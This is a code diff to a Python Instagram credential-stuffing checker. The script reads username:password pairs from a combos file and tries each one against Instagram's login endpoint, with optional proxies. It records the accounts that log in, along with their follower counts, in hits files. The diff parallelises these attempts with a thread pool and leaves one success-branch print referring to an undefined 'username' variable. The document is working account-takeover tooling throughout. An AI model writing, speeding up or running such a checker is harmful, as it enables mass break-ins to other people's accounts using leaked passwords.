@@ -6,6 +6,7 @@ import random
 from colorama import init,Fore
 from datetime import datetime
 from threading import Thread,Lock
+from multiprocessing.dummy import Pool as ThreadPool
 
 init()
 
@@ -40,7 +41,9 @@ def GetInstaFollowersNum(username):
     json_data = json.loads(response)
     return json_data['graphql']['user']['edge_followed_by']['count']
 
-def login_instagram(username, password,use_proxy:int):
+use_proxy = int(input('[QUESTION] Would you like to use proxies [1] yes [0] no: '))
+
+def login_instagram(combos):
     link = 'https://www.instagram.com/accounts/login/'
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
@@ -55,8 +58,8 @@ def login_instagram(username, password,use_proxy:int):
     csrf = response.cookies['csrftoken']
 
     payload = {
-        'username': username,
-        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{curtime}:{password}',
+        'username': combos.split('.')[0],
+        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,combos.split('.')[-1]),
         'queryParams': {},
         'optIntoOneTap': 'false'
     }
@@ -83,36 +86,47 @@ def login_instagram(username, password,use_proxy:int):
 
     if 'authenticated' in json_data:
         if json_data['authenticated'] == True:
-            followers = GetInstaFollowersNum(username)
-            PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(username,password,followers),Fore.GREEN,Fore.WHITE)
+            followers = GetInstaFollowersNum(combos.split('.')[0])
+            PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(username,combos.split('.')[-1],followers),Fore.GREEN,Fore.WHITE)
             with open('hits.txt','a') as f:
-                f.write('{0}:{1}\n'.format(username,password))
+                f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split('.')[-1]))
             with open('detailed_hits.txt','a') as f:
-                f.write('{0}:{1} FOLLOWERS: {2}'.format(username,password,followers))
+                f.write('{0}:{1} FOLLOWERS: {2}'.format(combos.split('.')[0],combos.split('.')[-1],followers))
         elif json_data['status'] == 'fail':
             if retry_time > 0:
-                PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
+                PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message'],retry_time),Fore.RED,Fore.WHITE)
                 time.sleep(retry_time)
         else:
-            PrintText('BAD','{0}:{1} -> failed to login'.format(username,password),Fore.RED,Fore.WHITE)
+            PrintText('BAD','{0}:{1} -> failed to login'.format(combos.split('.')[0],combos.split('.')[-1]),Fore.RED,Fore.WHITE)
             with open('bads.txt','a') as f:
-                f.write('{0}:{1}\n'.format(username,password))
+                f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split('.')[-1]))
     elif json_data['status'] == 'fail':
         if retry_time > 0:
-            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
+            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message'],retry_time),Fore.RED,Fore.WHITE)
             time.sleep(retry_time)
     else:
-        PrintText('ERROR','{0}:{1} -> {2}'.format(username,password,json_data['message']),Fore.RED,Fore.WHITE)
+        PrintText('ERROR','{0}:{1} -> {2}'.format(combos.split('.')[0],combos.split('.')[-1],json_data['message']),Fore.RED,Fore.WHITE)
 
 def PrintText(info_name,text,info_color:Fore,text_color:Fore):
     print(f'[{info_color+info_name+Fore.RESET}] '+text_color+f'{text}')
 
+def StartCheck(combos):
+    pool = ThreadPool()
+    results = pool.map(login_instagram,combos)
+    pool.close()
+    pool.join()
+
 if __name__ == "__main__":
-    use_proxy = int(input('[QUESTION] Would you like to use proxies [1] yes [0] no: '))
+    
+    print('')
     combos = ReadFile('combos.txt','r')
 
-    lock = Lock()
-    for combo in combos:
-        lock.acquire()
-        Thread(target=login_instagram(combo.split(':')[0],combo.split(':')[-1],use_proxy))
-        lock.release()
+    StartCheck(combos)
+    #for combo in combos:
+    
+    #Parallel(n_jobs=num_cores)(delayed(Thread(target=login_instagram(combo.split(':')[0],combo.split(':')[-1],use_proxy))) for combo in combos)
+    #num_cores = multiprocessing.cpu_count()
+    #lock = Lock()
+    #lock.acquire()
+    #Thread(target=StartCheck(combos,use_proxy))
+    #lock.release()
